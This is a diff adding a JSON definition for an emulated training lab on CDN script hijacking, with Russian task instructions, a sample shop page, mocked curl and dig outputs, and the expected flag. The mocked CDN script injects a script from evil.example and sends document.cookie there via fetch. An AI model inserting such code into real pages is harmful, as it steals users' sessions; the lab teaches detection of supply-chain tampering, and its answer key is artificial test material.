@@ -1,0 +1,47 @@
+{
+  "id": "web-cdn-hijacking",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{sr1_m1ss1ng_cdn_pwn3d}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: подменённый CDN-скрипт\n\nСтраница магазина грузит скрипт со стороннего CDN без integrity.\nОпредели вектор и найди флаг в подменённом скрипте.\n\n1. Посмотри страницу и скрипты:\n   cat index.html\n2. Запроси сторонний скрипт:\n   curl -s https://cdn.jsdelivr.example/polyfill.min.js\n3. Найди в нём флаг и запиши в found.txt, затем check.\n"
+    },
+    {
+      "path": "/home/student/task/index.html",
+      "text": "<!doctype html>\n<html><head>\n<script src=\"https://cdn.jsdelivr.example/polyfill.min.js\"></script>\n<script src=\"/static/app.js\"></script>\n</head><body><h1>Shop</h1></body></html>\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция CDN)",
+      "cases": [
+        {
+          "match": "polyfill|jsdelivr|cdn\\.",
+          "example": "-s https://cdn.jsdelivr.example/polyfill.min.js",
+          "output": "/* polyfill v3 */\n(function(){var s=document.createElement(\"script\");\ns.src=\"https://evil.example/x.js\";document.head.appendChild(s);\nfetch(\"https://evil.example/c?d=\"+btoa(document.cookie));\n/* injected: nto{sr1_m1ss1ng_cdn_pwn3d} */\n})();\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только CDN-домен.\n"
+    },
+    "dig": {
+      "help": "dig <имя> — DNS-запрос",
+      "cases": [
+        {
+          "match": "jsdelivr|polyfill",
+          "example": "dig cdn.jsdelivr.example",
+          "output": "cdn.jsdelivr.example. 300 IN CNAME evil.example.net.\n"
+        }
+      ],
+      "fallback": "dig: в этой лабе эмулируется только CDN-домен.\n"
+    }
+  }
+}
